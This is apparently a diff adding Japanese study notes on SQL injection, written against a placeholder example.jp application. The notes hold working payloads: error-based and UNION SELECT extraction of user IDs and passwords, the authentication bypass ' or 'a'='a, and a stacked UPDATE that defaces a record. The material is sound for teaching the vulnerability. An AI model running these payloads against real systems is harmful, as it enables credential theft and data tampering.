@@ -1,0 +1,36 @@
+■SQLの呼び出しに伴う脆弱性
+攻撃者が利用者の介在無しに攻撃を行うことができる。(能動的攻撃)
+SQLの呼び出しに不備があると、以下の様な事象が発生しうる。
+1.DBの情報が外部から盗まれる。
+2.内容が不正に書き換えられる。
+3.認証が回避される。
+4.DB上のファイル、プログラムの読み出し/書き込み/実行が行われる。
+
+★攻撃例1
+GETパラメータを受け取り、検索するSQLを想定する。
+今回は、SQLのエラーを発生させ、サーバ側の設定により
+エラーの詳細からDBの一部の情報が漏洩している例である。
+
+☆正常なリクエストURL
+http://example.jp/44/44-001.php?author=Shakespeare
+☆異常なリクエストURL
+http://example.jp/44/44-001.php?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--
+
+★攻撃例2
+UNION SELECTを用いることで本来取得できない情報を取得している。
+http://example.jp/44/44-001.php?author=author='+union+select+id,pwd,name,addr,null,null,null+from+users--
+
+★SQLインジェクションによる認証回避
+input欄に入力するSQLにより、SELECT文のWHERE句が常に成立する事象が発生する。
+以下をパスワード入力欄に入力する。
+' or 'a'='a
+実行されるSQLは以下となる。
+SELECT * FROM users WHERE id = 'yamada' and pwd = '' OR 'a'='a'
+
+★SQLインジェクションによる不正なデータ書き換え
+検索のSQLが中断され、続くUPDATE文が有効となる事象が発生する。
+http://example.jp/44/44-001.php?author=';update+books+set+title%3D'<i>cracked!</i>'+where+id%3d'1001'--
+実行されるSQLは以下となる。
+--を入力することで、以降のSQLは向こうとなるため、ORDER BYは実行されない。
+SELECT * FROM books WHERE author = '';
+update books set title='<i>cracked!</i>' where id='1001' --'ORDER BY id
